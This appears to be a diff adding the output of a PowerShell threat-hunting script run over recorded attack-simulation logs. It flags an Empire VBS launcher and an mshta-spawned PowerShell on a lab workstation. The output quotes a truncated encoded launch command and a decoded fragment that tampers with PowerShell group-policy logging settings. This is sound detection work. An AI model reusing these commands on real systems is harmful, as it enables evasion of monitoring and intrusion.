@@ -1,0 +1,17 @@
+$ python3 scripts/hunt_powershell.py empire_launcher_vbs_2020-09-04160940.json cmd_mshta_vbscript_execute_psh_2020-10-2202580804.json psh_powershell_httplistener_2020-11-0204130683.json
+== empire_launcher_vbs_2020-09-04160940.json: 3 hits
+   by event: {'Microsoft-Windows-Sysmon:1': 1, 'Security:4688': 1, 'Microsoft-Windows-PowerShell:4104': 1}
+   [2020-09-04T20:09:57.060Z] 1 host=WORKSTATION5.theshire.local parent=C:\Windows\System32\wscript.exe (suspicious arguments)
+     cmd: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0
+     decoded: If($PSVERSiOnTaBlE.PSVErSIOn.MajOR -gE 3){$6866=[rEF].ASsEMbLY.GetTYPE('System.Management.Automation.Utils')."GEtFie`LD"('cachedGroupPolicySettings','N'+'onPublic,Static');If($6866){$1fe7=$6866.GetVaL
+   [2020-09-04T20:10:00.327Z] 4104 host=WORKSTATION5.theshire.local parent=- (suspicious arguments)
+     cmd: If($PSVERSiOnTaBlE.PSVErSIOn.MajOR -gE 3){$6866=[rEF].ASsEMbLY.GetTYPE('System.Management.Automation.Utils')."GEtFie`LD"('cachedGroupPolicySettings','N'+'onPubl
+
+== cmd_mshta_vbscript_execute_psh_2020-10-2202580804.json: 2 hits
+   by event: {'Security:4688': 1, 'Microsoft-Windows-Sysmon:1': 1}
+   [2020-10-22T02:58:00.462Z] 4688 host=WORKSTATION5 parent=C:\Windows\System32\mshta.exe (parent is mshta.exe)
+     cmd: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Get-Service sysmon
+
+== psh_powershell_httplistener_2020-11-0204130683.json: 0 hits
+   by event: {}
+
